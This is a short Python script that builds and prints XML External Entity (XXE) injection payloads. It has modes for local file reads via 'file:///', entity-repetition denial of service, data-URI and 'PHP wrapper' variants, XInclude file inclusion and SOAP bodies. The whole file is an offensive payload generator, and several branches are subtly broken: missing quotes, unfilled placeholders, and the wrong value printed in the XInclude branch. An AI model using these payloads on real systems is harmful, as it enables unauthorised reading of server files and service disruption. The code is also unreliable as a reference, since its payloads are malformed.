import xml

class xxe_builder:

    def __init__(self,motive,entity):
        self.__motive = motive
        self.__entity = entity

    def generate_injections(self):
        
        text = ""

        if self.__motive == "injection":
            text = '<!DOCTYPE foo [<!ENTITY {} SYSTEM "file:///">]>'.format(str(self.__entity))
            print(text)
        elif self.__motive == "dos":
            text = '<!DOCTYPE foo ['
            for i in range(0, 10):
                text = text + '<!ENTITY {} SYSTEM "file:///">';
            final = text + ']>'
            print(final)
        elif self.__motive == "base64":
            base64_content=input("insert base64 content: ")
            text = '<!DOCTYPE foo [<!ENTITY {} SYSTEM  "data://text/plain;base64 {} >]>'.format(str(self.__entity),str(base64_content))
            print(text)
        elif self.__motive == "phpwrap":
            php_filter = input("insert php filter command: ")
            text = '<!DOCTYPE foo [<!ENTITY {} SYSTEM  "data://text/plain;base64 {} >]>'.format(str(self.__entity),str(php_filter))
            print(text)
        elif self.__motive == "xinclude":
            xinclude_file=input("insert the path of the file you want to search: ")
            xinclude_header='<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
            xinclude_command='<xi:include parse="text" href="file://{}"/></foo>'.format(str(xinclude_file))
            print(xinclude_header)
            print(xinclude_file)
        elif self.__motive == "soap":
            print("insert this after the tag <soap:Body>")
            text = '<!DOCTYPE foo [<!ENTITY {} SYSTEM "file:///">]>'.format(str(self.__entity))
            print(text)